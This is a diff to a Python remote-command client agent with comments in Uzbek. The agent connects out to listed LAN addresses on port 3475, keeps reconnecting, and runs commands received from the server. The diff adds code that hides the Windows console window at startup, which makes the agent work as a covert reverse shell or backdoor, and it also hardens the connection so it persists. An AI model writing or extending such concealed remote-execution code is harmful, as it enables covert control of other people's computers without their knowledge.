@@ -7,12 +7,22 @@ import os
 import sys
 import platform
 
+# Windowsda konsol oynasini darhol yashirish
+if sys.platform == "win32":
+    try:
+        import ctypes
+        _hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if _hwnd:
+            ctypes.windll.user32.ShowWindow(_hwnd, 0)
+    except Exception:
+        pass
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
 
 # ── Standart Sozlamalar ──────────────────────────────────────
 
-DEFAULT_HOSTS = ["192.168.100.250", "192.168.1.100", "192.168.0.100", "127.0.0.1"]
+DEFAULT_HOSTS = ["192.168.1.3", "192.168.100.250", "192.168.1.100", "192.168.0.100", "127.0.0.1"]
 SERVER_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3475
 
 # Client nomi: muhit o'zgaruvchisi > kompyuter nomi
@@ -189,6 +199,9 @@ class ClientAgent:
                 print(f"[~] {host}:{SERVER_PORT} ga ulanishga harakat qilinmoqda...")
                 try:
                     s = socket.create_connection((host, SERVER_PORT), timeout=CONNECT_TIMEOUT)
+                    s.settimeout(None)
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                     sock = s
                     connected_host = host
                     break
@@ -206,6 +219,14 @@ class ClientAgent:
                     self._listen(sock, connected_host)
                 except Exception as e:
                     print(f"[!] Aloqa uzildi: {e}")
+                finally:
+                    with self._sock_lock:
+                        if self._sock is sock:
+                            self._sock = None
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
             else:
                 print(f"[!] Serverlar ro'yxatidagi hech qaysi IP ga ulanib bo'lmadi.")
 
@@ -216,6 +237,7 @@ class ClientAgent:
                 time.sleep(RECONNECT_DELAY)
 
     def _listen(self, sock: socket.socket, host: str):
+        sock.settimeout(None)
         with self._sock_lock:
             self._sock = sock
         print(f"[✓] Serverga muvaffaqiyatli ulandi: {host}:{SERVER_PORT}")
@@ -415,7 +437,8 @@ class ClientAgent:
         except Exception:
             pass
         with self._sock_lock:
-            self._sock = None
+            if self._sock is sock:
+                self._sock = None
 
     def _execute_and_reply(self, sock, cmd):
         stdout, stderr = run_command(cmd)
